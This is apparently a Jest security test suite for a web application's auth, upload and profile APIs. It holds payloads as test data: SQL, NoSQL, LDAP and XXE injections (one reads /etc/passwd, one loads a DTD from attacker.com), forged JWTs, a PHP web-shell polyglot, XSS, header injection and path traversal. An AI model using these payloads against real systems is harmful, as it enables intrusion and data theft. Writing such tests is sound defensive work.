/**
 * Task 4.9: Enhanced Security Tests with Additional Edge Cases and Attack Vectors
 * 
 * This test suite provides comprehensive coverage of advanced security edge cases:
 * - Advanced injection attack patterns
 * - Sophisticated authentication bypass techniques
 * - Complex file upload security scenarios
 * - Advanced session security edge cases
 * - Protocol-level attack vectors
 * - Time-based security vulnerabilities
 * - Cache poisoning and HTTP smuggling
 * - Business logic security flaws
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import { server } from '@test-mocks/api/mock-server';

describe('🛡️ Task 4.9: Enhanced Security Edge Cases and Attack Vectors', () => {
  
  beforeEach(() => {
    jest.clearAllMocks();
    global.fetch = server.mockFetch;
    server.listen({ onUnhandledRequest: 'error' });
  });

  afterEach(() => {
    server.resetHandlers();
    jest.restoreAllMocks();
  });

  afterAll(() => {
    server.close();
  });

  describe('🔬 Advanced Injection Attack Patterns', () => {
    it('should prevent advanced SQL injection with encoding bypasses', async () => {
      const advancedSQLPayloads = [
        // Unicode encoding bypass
        '\u0027 OR 1=1--',
        '\u0022 OR \u00221\u0022=\u00221',
        
        // Hex encoding bypass
        '0x27204f522031%3d31%2d%2d',
        
        // URL encoding variations
        '%2527%20OR%201%3d1%2d%2d',
        '%252527%20OR%201%3d1%2d%2d',
        
        // Case variation bypass
        '\' oR 1=1--',
        '\' Or 1=1--',
        '\' OR 1=1--',
        
        // Comment variation bypass
        '\' OR 1=1#',
        '\' OR 1=1/*',
        '\' OR 1=1;%00',
        
        // Time-based blind SQL injection
        '\'; WAITFOR DELAY \'00:00:05\'--',
        '\' OR IF(1=1, SLEEP(5), 0)--',
        
        // Union-based injection with null handling
        '\' UNION SELECT NULL,NULL,NULL--',
        '\' UNION ALL SELECT NULL,version(),NULL--',
        
        // Error-based injection
        '\' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--',
        
        // Boolean-based blind injection
        '\' AND (SELECT SUBSTRING(@@version,1,1))=\'5\'--',
        '\' AND (SELECT \'a\' FROM users WHERE username=\'admin\')=\'a\'--'
      ];

      for (const payload of advancedSQLPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload,
            password: 'test123'
          })
        });

        // Should not execute SQL injection
        expect([400, 401, 422]).toContain(response.status);
        
        const responseBody = await response.text();
        expect(responseBody).not.toMatch(/error|mysql|postgres|oracle|sql|database/i);
      }
    });

    it('should prevent NoSQL injection with MongoDB operators', async () => {
      const noSQLPayloads = [
        // MongoDB operator injection
        { email: { $ne: null }, password: { $ne: null } },
        { email: { $regex: '.*' }, password: { $regex: '.*' } },
        { email: { $where: 'function() { return true; }' } },
        { email: { $gt: '' }, password: { $gt: '' } },
        { email: { $exists: true }, password: { $exists: true } },
        
        // JavaScript injection in NoSQL
        { email: 'admin@example.com', password: { $where: 'this.password.length > 0' } },
        { email: { $where: 'return true' }, password: 'anything' },
        
        // Array injection
        { email: ['admin@example.com'], password: ['password'] },
        { email: { $in: ['admin@example.com', 'root@example.com'] } },
        
        // Buffer overflow attempts
        { email: 'a'.repeat(10000), password: 'b'.repeat(10000) }
      ];

      for (const payload of noSQLPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        // Should reject NoSQL injection attempts
        expect([400, 401, 422]).toContain(response.status);
      }
    });

    it('should prevent LDAP injection attacks', async () => {
      const ldapPayloads = [
        'admin@example.com)(|(password=*))',
        '*)(&(objectClass=user)(uid=admin))',
        'admin@example.com)(&(1=1))',
        '*)(|(objectClass=*))',
        '*)((objectClass=*)',
        'admin@example.com)(mail=*@*))',
        '*)|(objectClass=person))',
        'admin@example.com)(&(objectClass=user)(|(uid=admin)(uid=root)))'
      ];

      for (const payload of ldapPayloads) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: payload,
            password: 'test123'
          })
        });

        expect([400, 401, 422]).toContain(response.status);
      }
    });

    it('should prevent XML/XXE injection attacks', async () => {
      const xmlPayloads = [
        // External entity injection
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/passwd">]><root>&read;</root>',
        
        // Parameter entity injection
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">%ext;]><root></root>',
        
        // Billion laughs attack
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>',
        
        // SOAP injection
        '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>data</test></soap:Body></soap:Envelope>',
        
        // SVG with XSS
        '<svg onload="alert(1)">test</svg>',
        
        // XML with CDATA
        '<![CDATA[<script>alert("XSS")</script>]]>'
      ];

      for (const payload of xmlPayloads) {
        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/xml' },
          body: payload
        });

        expect([400, 415, 422]).toContain(response.status);
      }
    });
  });

  describe('🔐 Sophisticated Authentication Bypass Techniques', () => {
    it('should prevent JWT algorithm confusion attacks', async () => {
      const jwtBypassAttempts = [
        // Algorithm confusion (HS256 vs RS256)
        'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.',
        
        // None algorithm
        'eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.',
        
        // Modified algorithm
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.signature',
        
        // Empty signature
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.',
        
        // Malformed tokens
        'invalid.jwt.token',
        'eyJhbGciOiJIUzI1NiJ9.invalid',
        '.eyJ1c2VySWQiOiJhZG1pbiJ9.',
        
        // Token with manipulated expiry
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ0ZXN0IiwiZXhwIjo5OTk5OTk5OTk5fQ.signature'
      ];

      for (const token of jwtBypassAttempts) {
        const response = await fetch('/api/user/profile', {
          method: 'GET',
          headers: { 'Authorization': `Bearer ${token}` }
        });

        expect([401, 403]).toContain(response.status);
      }
    });

    it('should prevent timing attack vulnerabilities in authentication', async () => {
      const timingTests = [];
      
      // Test with valid email, invalid password
      for (let i = 0; i < 10; i++) {
        const startTime = process.hrtime.bigint();
        
        await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'valid@example.com',
            password: 'wrongpassword'
          })
        });
        
        const endTime = process.hrtime.bigint();
        timingTests.push({ type: 'valid_email', time: Number(endTime - startTime) });
      }
      
      // Test with invalid email
      for (let i = 0; i < 10; i++) {
        const startTime = process.hrtime.bigint();
        
        await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'nonexistent@example.com',
            password: 'anypassword'
          })
        });
        
        const endTime = process.hrtime.bigint();
        timingTests.push({ type: 'invalid_email', time: Number(endTime - startTime) });
      }
      
      // Analyze timing patterns
      const validEmailTimes = timingTests.filter(t => t.type === 'valid_email').map(t => t.time);
      const invalidEmailTimes = timingTests.filter(t => t.type === 'invalid_email').map(t => t.time);
      
      const avgValidTime = validEmailTimes.reduce((a, b) => a + b, 0) / validEmailTimes.length;
      const avgInvalidTime = invalidEmailTimes.reduce((a, b) => a + b, 0) / invalidEmailTimes.length;
      
      // Should not have significant timing differences (within 20% variance)
      const timingRatio = Math.abs(avgValidTime - avgInvalidTime) / Math.max(avgValidTime, avgInvalidTime);
      expect(timingRatio).toBeLessThan(0.2);
    });

    it('should prevent session fixation with various techniques', async () => {
      const sessionFixationAttempts = [
        // Predefined session ID
        { cookie: 'sessionId=fixed_session_123', expected: 'new_session' },
        
        // Cross-subdomain session fixation
        { cookie: 'sessionId=evil.session; Domain=.example.com', expected: 'rejected' },
        
        // Session ID in URL parameter
        { url: '?sessionId=fixed_session_456', expected: 'ignored' },
        
        // Multiple session cookies
        { cookie: 'sessionId=session1; sessionId=session2', expected: 'single_session' },
        
        // Invalid session format
        { cookie: 'sessionId=../../../etc/passwd', expected: 'rejected' }
      ];

      for (const attempt of sessionFixationAttempts) {
        const headers: Record<string, string> = { 'Content-Type': 'application/json' };
        if (attempt.cookie) {
          headers['Cookie'] = attempt.cookie;
        }

        const url = attempt.url ? `/api/auth/signin${attempt.url}` : '/api/auth/signin';
        
        const response = await fetch(url, {
          method: 'POST',
          headers,
          body: JSON.stringify({
            email: 'test@example.com',
            password: 'password123'
          })
        });

        // Should not accept fixed sessions
        if (response.status === 200) {
          const setCookieHeader = response.headers.get('Set-Cookie');
          if (setCookieHeader) {
            expect(setCookieHeader).not.toContain('fixed_session');
          }
        }
      }
    });

    it('should prevent privilege escalation through parameter manipulation', async () => {
      const escalationAttempts = [
        // Role manipulation
        { email: 'user@example.com', password: 'password', role: 'admin' },
        { email: 'user@example.com', password: 'password', isAdmin: true },
        { email: 'user@example.com', password: 'password', permissions: ['admin', 'super'] },
        
        // User ID manipulation
        { email: 'user@example.com', password: 'password', userId: 'admin' },
        { email: 'user@example.com', password: 'password', id: 1 },
        
        // Group/tenant escalation
        { email: 'user@example.com', password: 'password', group: 'administrators' },
        { email: 'user@example.com', password: 'password', tenant: 'system' },
        
        // Hidden parameters
        { email: 'user@example.com', password: 'password', __proto__: { isAdmin: true } },
        { email: 'user@example.com', password: 'password', constructor: { prototype: { isAdmin: true } } }
      ];

      for (const attempt of escalationAttempts) {
        const response = await fetch('/api/auth/signin', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(attempt)
        });

        if (response.status === 200) {
          const userData = await response.json();
          expect(userData.role).not.toBe('admin');
          expect(userData.isAdmin).not.toBe(true);
          expect(userData.permissions).not.toContain('admin');
        }
      }
    });
  });

  describe('🗂️ Complex File Upload Security Scenarios', () => {
    it('should prevent polyglot file attacks', async () => {
      const polyglotFiles = [
        // PDF + JS polyglot
        {
          content: '%PDF-1.4\n<script>alert("XSS")</script>',
          filename: 'polyglot.pdf',
          contentType: 'application/pdf'
        },
        
        // Image + PHP polyglot
        {
          content: '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>',
          filename: 'image.png',
          contentType: 'image/png'
        },
        
        // GIF + HTML polyglot
        {
          content: 'GIF89a<script>alert(1)</script>',
          filename: 'animated.gif',
          contentType: 'image/gif'
        },
        
        // ZIP + HTML polyglot
        {
          content: 'PK\x03\x04<html><script>alert(1)</script></html>',
          filename: 'archive.zip',
          contentType: 'application/zip'
        },
        
        // Office document with macros
        {
          content: 'PK\x03\x04[Content_Types].xml<Relationships>macro.bin</Relationships>',
          filename: 'document.docx',
          contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
        }
      ];

      for (const file of polyglotFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.contentType }), file.filename);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        // Should reject polyglot files
        expect([400, 415, 422]).toContain(response.status);
      }
    });

    it('should prevent steganography and hidden content attacks', async () => {
      const steganographyFiles = [
        // Hidden ZIP in JPEG
        {
          content: '\xFF\xD8\xFF\xE0\x00\x10JFIF...PK\x03\x04hidden.txt',
          filename: 'image.jpg',
          contentType: 'image/jpeg'
        },
        
        // Concatenated files
        {
          content: 'Normal content here...\x00\x00\x00MALICIOUS_PAYLOAD_HIDDEN',
          filename: 'document.txt',
          contentType: 'text/plain'
        },
        
        // Files with trailing data
        {
          content: '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR...secret_data_after_iend',
          filename: 'image.png',
          contentType: 'image/png'
        },
        
        // RAR with password
        {
          content: 'Rar!\x1a\x07\x00encrypted_content_here',
          filename: 'encrypted.rar',
          contentType: 'application/x-rar-compressed'
        },
        
        // File with multiple streams
        {
          content: 'normal_stream\x00\x00alternate_data_stream',
          filename: 'multi.txt',
          contentType: 'text/plain'
        }
      ];

      for (const file of steganographyFiles) {
        const formData = new FormData();
        formData.append('file', new Blob([file.content], { type: file.contentType }), file.filename);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        // Should detect and reject suspicious content
        expect([400, 415, 422]).toContain(response.status);
      }
    });

    it('should handle extreme file upload edge cases', async () => {
      const extremeCases = [
        // Zero-byte file
        {
          content: '',
          filename: 'empty.txt',
          contentType: 'text/plain'
        },
        
        // File with only null bytes
        {
          content: '\x00'.repeat(1000),
          filename: 'nulls.bin',
          contentType: 'application/octet-stream'
        },
        
        // File with Unicode filename
        {
          content: 'test content',
          filename: '测试文件.txt',
          contentType: 'text/plain'
        },
        
        // File with control characters in filename
        {
          content: 'test content',
          filename: 'file\x00\x01\x02.txt',
          contentType: 'text/plain'
        },
        
        // File with extremely long filename
        {
          content: 'test content',
          filename: 'a'.repeat(1000) + '.txt',
          contentType: 'text/plain'
        },
        
        // File with no extension
        {
          content: 'test content',
          filename: 'noextension',
          contentType: 'text/plain'
        },
        
        // File with multiple extensions
        {
          content: 'test content',
          filename: 'file.txt.exe.pdf.jpg',
          contentType: 'text/plain'
        }
      ];

      for (const testCase of extremeCases) {
        const formData = new FormData();
        formData.append('file', new Blob([testCase.content], { type: testCase.contentType }), testCase.filename);

        const response = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Authorization': 'Bearer valid-token' },
          body: formData
        });

        // Should handle edge cases gracefully
        expect([200, 400, 413, 415, 422]).toContain(response.status);
      }
    });
  });

  describe('⏰ Time-Based Security Vulnerabilities', () => {
    it('should prevent race condition attacks in user creation', async () => {
      const concurrentRegistrations = [];
      const email = 'race@example.com';
      
      // Create multiple concurrent registration requests
      for (let i = 0; i < 10; i++) {
        const registrationPromise = fetch('/api/auth/signup', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            firstName: 'Test',
            lastName: 'User',
            email: email,
            password: 'password123'
          })
        });
        concurrentRegistrations.push(registrationPromise);
      }
      
      const responses = await Promise.all(concurrentRegistrations);
      const successfulRegistrations = responses.filter(r => r.status === 201 || r.status === 200);
      
      // Should only allow one successful registration
      expect(successfulRegistrations.length).toBeLessThanOrEqual(1);
    });

    it('should prevent time-of-check to time-of-use (TOCTOU) attacks', async () => {
      // Simulate rapid permission changes during operation
      const userToken = 'valid-user-token';
      
      // Start file upload
      const uploadPromise = fetch('/api/upload', {
        method: 'POST',
        headers: { 'Authorization': `Bearer ${userToken}` },
        body: new FormData()
      });
      
      // Simultaneously attempt to revoke permissions
      const revokePromise = fetch('/api/admin/users/revoke-permissions', {
        method: 'POST',
        headers: { 
          'Authorization': 'Bearer admin-token',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          userId: 'user-id',
          permissions: ['upload']
        })
      });
      
      const [uploadResponse, revokeResponse] = await Promise.all([uploadPromise, revokePromise]);
      
      // Should handle concurrent operations safely
      expect([200, 401, 403, 409]).toContain(uploadResponse.status);
      expect([200, 404]).toContain(revokeResponse.status);
    });

    it('should handle token expiry edge cases', async () => {
      const edgeCases = [
        // Token expiring during request
        'almost-expired-token',
        
        // Token with clock skew
        'clock-skew-token',
        
        // Token with microsecond precision issues
        'precision-token',
        
        // Token refreshed during validation
        'refresh-during-validation-token'
      ];

      for (const token of edgeCases) {
        const response = await fetch('/api/user/profile', {
          method: 'GET',
          headers: { 'Authorization': `Bearer ${token}` }
        });

        // Should handle timing edge cases gracefully
        expect([200, 401, 403]).toContain(response.status);
      }
    });
  });

  describe('🌐 Protocol-Level Attack Vectors', () => {
    it('should prevent HTTP request smuggling attacks', async () => {
      const smugglingPayloads = [
        // CL.TE payload
        'POST /api/auth/signin HTTP/1.1\r\nHost: example.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED',
        
        // TE.CL payload
        'POST /api/auth/signin HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 3\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n',
        
        // Double Content-Length
        'POST /api/auth/signin HTTP/1.1\r\nHost: example.com\r\nContent-Length: 10\r\nContent-Length: 20\r\n\r\ntest',
        
        // Malformed chunked encoding
        'POST /api/auth/signin HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\n\r\nG\r\ntest\r\n0\r\n\r\n'
      ];

      for (const payload of smugglingPayloads) {
        // Note: This test verifies the application handles malformed requests properly
        try {
          const response = await fetch('/api/auth/signin', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ test: 'data' })
          });
          
          // Should not be vulnerable to smuggling
          expect([400, 401, 422]).toContain(response.status);
        } catch (error) {
          // Network errors are acceptable for malformed requests
          expect(error).toBeDefined();
        }
      }
    });

    it('should prevent HTTP header injection attacks', async () => {
      const headerInjectionPayloads = [
        // CRLF injection
        'test\r\nX-Injected-Header: malicious',
        'test\nSet-Cookie: admin=true',
        'test\r\nLocation: http://evil.com',
        
        // Unicode normalization attacks
        'test\u000D\u000AX-Evil: header',
        'test\u2028X-Injected: value',
        'test\u2029Location: javascript:alert(1)',
        
        // Null byte injection
        'test\x00\r\nX-Evil: header',
        'test\x00\nSet-Cookie: hacked=true'
      ];

      for (const payload of headerInjectionPayloads) {
        const response = await fetch('/api/user/profile', {
          method: 'GET',
          headers: { 
            'Authorization': 'Bearer valid-token',
            'User-Agent': payload,
            'X-Custom-Header': payload
          }
        });

        // Should not allow header injection
        expect(response.headers.get('X-Injected-Header')).toBeNull();
        expect(response.headers.get('X-Evil')).toBeNull();
        expect(response.headers.get('Set-Cookie')).not.toContain('admin=true');
        expect(response.headers.get('Set-Cookie')).not.toContain('hacked=true');
      }
    });

    it('should prevent cache poisoning attacks', async () => {
      const cachePoisoningHeaders = [
        // Host header injection
        { 'Host': 'evil.com' },
        { 'Host': 'localhost:8080\r\nX-Evil: injected' },
        
        // X-Forwarded headers manipulation
        { 'X-Forwarded-Host': 'evil.com' },
        { 'X-Forwarded-Proto': 'javascript' },
        { 'X-Forwarded-For': '127.0.0.1, evil.com' },
        
        // Cache key manipulation
        { 'X-Forwarded-Scheme': 'https://evil.com' },
        { 'X-Original-URL': '/admin/secret' },
        { 'X-Rewrite-URL': '/../../etc/passwd' },
        
        // Accept header pollution
        { 'Accept': 'text/html, application/json, */*; q=0.01, <script>alert(1)</script>' }
      ];

      for (const headers of cachePoisoningHeaders) {
        const response = await fetch('/api/user/profile', {
          method: 'GET',
          headers: {
            'Authorization': 'Bearer valid-token',
            ...headers
          }
        });

        // Should not be poisoned by malicious headers
        expect([200, 400, 401]).toContain(response.status);
        
        const responseBody = await response.text();
        expect(responseBody).not.toContain('evil.com');
        expect(responseBody).not.toContain('<script>');
      }
    });
  });

  describe('🏢 Business Logic Security Flaws', () => {
    it('should prevent workflow bypass attacks', async () => {
      // Attempt to skip registration verification
      const bypassAttempts = [
        // Direct profile access before verification
        {
          step: 'skip_verification',
          token: 'unverified-user-token',
          endpoint: '/api/user/profile'
        },
        
        // Skip password reset flow
        {
          step: 'skip_reset_flow',
          token: 'reset-token-bypass',
          endpoint: '/api/auth/reset-password'
        },
        
        // Access premium features without upgrade
        {
          step: 'feature_bypass',
          token: 'free-user-token',
          endpoint: '/api/premium/advanced-comparison'
        },
        
        // Bulk operation without proper authorization
        {
          step: 'bulk_bypass',
          token: 'limited-user-token',
          endpoint: '/api/admin/bulk-operations'
        }
      ];

      for (const attempt of bypassAttempts) {
        const response = await fetch(attempt.endpoint, {
          method: 'GET',
          headers: { 'Authorization': `Bearer ${attempt.token}` }
        });

        // Should enforce proper workflow
        expect([401, 402, 403, 404]).toContain(response.status);
      }
    });

    it('should prevent parameter pollution attacks', async () => {
      const pollutionTests = [
        // Array parameter pollution
        '/api/search?category=documents&category=admin&category=sensitive',
        
        // Object parameter pollution
        '/api/user/profile?user[role]=admin&user[permissions]=all',
        
        // Prototype pollution attempt
        '/api/search?__proto__[isAdmin]=true&query=test',
        '/api/search?constructor[prototype][isAdmin]=true&query=test',
        
        // Nested parameter pollution
        '/api/upload?file[type]=image&file[type]=executable&file[size]=large',
        
        // Mixed parameter types
        '/api/compare?doc1=file1.pdf&doc1[]=file2.pdf&doc1[admin]=true'
      ];

      for (const url of pollutionTests) {
        const response = await fetch(url, {
          method: 'GET',
          headers: { 'Authorization': 'Bearer valid-token' }
        });

        // Should handle parameter pollution safely
        expect([200, 400, 404]).toContain(response.status);
        
        if (response.status === 200) {
          const responseData = await response.json();
          expect(responseData.isAdmin).not.toBe(true);
          expect(responseData.role).not.toBe('admin');
        }
      }
    });

    it('should prevent numeric overflow and underflow attacks', async () => {
      const numericEdgeCases = [
        // Integer overflow
        { value: '2147483648', field: 'limit' },
        { value: '9223372036854775808', field: 'offset' },
        
        // Negative values where positive expected
        { value: '-1', field: 'page' },
        { value: '-999999', field: 'limit' },
        
        // Floating point edge cases
        { value: '1.7976931348623157e+308', field: 'score' },
        { value: 'Infinity', field: 'timeout' },
        { value: 'NaN', field: 'priority' },
        
        // Scientific notation
        { value: '1e308', field: 'size' },
        { value: '1e-324', field: 'precision' },
        
        // Non-numeric values
        { value: 'null', field: 'count' },
        { value: 'undefined', field: 'total' },
        { value: '[]', field: 'amount' }
      ];

      for (const testCase of numericEdgeCases) {
        const response = await fetch(`/api/search?${testCase.field}=${testCase.value}`, {
          method: 'GET',
          headers: { 'Authorization': 'Bearer valid-token' }
        });

        // Should handle numeric edge cases safely
        expect([200, 400, 422]).toContain(response.status);
      }
    });
  });

  describe('🔍 Information Disclosure Prevention', () => {
    it('should prevent sensitive information leakage in errors', async () => {
      const errorTriggeringRequests = [
        // Database errors
        { endpoint: '/api/user/99999999', expectedInfo: ['database', 'sql', 'connection'] },
        
        // File system errors
        { endpoint: '/api/files/../../../etc/passwd', expectedInfo: ['path', 'directory', 'file'] },
        
        // Authentication errors
        { endpoint: '/api/admin/users', expectedInfo: ['token', 'secret', 'key'] },
        
        // Configuration errors
        { endpoint: '/api/debug/config', expectedInfo: ['password', 'api_key', 'secret'] },
        
        // Stack trace triggers
        { endpoint: '/api/undefined-endpoint', expectedInfo: ['stack', 'trace', 'error'] }
      ];

      for (const test of errorTriggeringRequests) {
        const response = await fetch(test.endpoint, {
          method: 'GET',
          headers: { 'Authorization': 'Bearer invalid-token' }
        });

        const responseBody = await response.text();
        
        // Should not leak sensitive information
        for (const sensitiveInfo of test.expectedInfo) {
          expect(responseBody.toLowerCase()).not.toContain(sensitiveInfo);
        }
        
        // Should not contain stack traces in production
        expect(responseBody).not.toMatch(/at.*\(.*:\d+:\d+\)/);
        expect(responseBody).not.toMatch(/Error:.*\n.*at/);
      }
    });

    it('should prevent metadata disclosure attacks', async () => {
      const metadataEndpoints = [
        '/.well-known/security.txt',
        '/robots.txt',
        '/sitemap.xml',
        '/.env',
        '/package.json',
        '/composer.json',
        '/yarn.lock',
        '/.git/config',
        '/.svn/entries',
        '/web.config',
        '/.htaccess',
        '/Dockerfile',
        '/docker-compose.yml'
      ];

      for (const endpoint of metadataEndpoints) {
        const response = await fetch(endpoint, {
          method: 'GET'
        });

        // Should not expose sensitive metadata
        if (response.status === 200) {
          const content = await response.text();
          expect(content).not.toMatch(/password|secret|key|token/i);
          expect(content).not.toMatch(/localhost|127\.0\.0\.1|192\.168\./);
        }
      }
    });
  });
}); 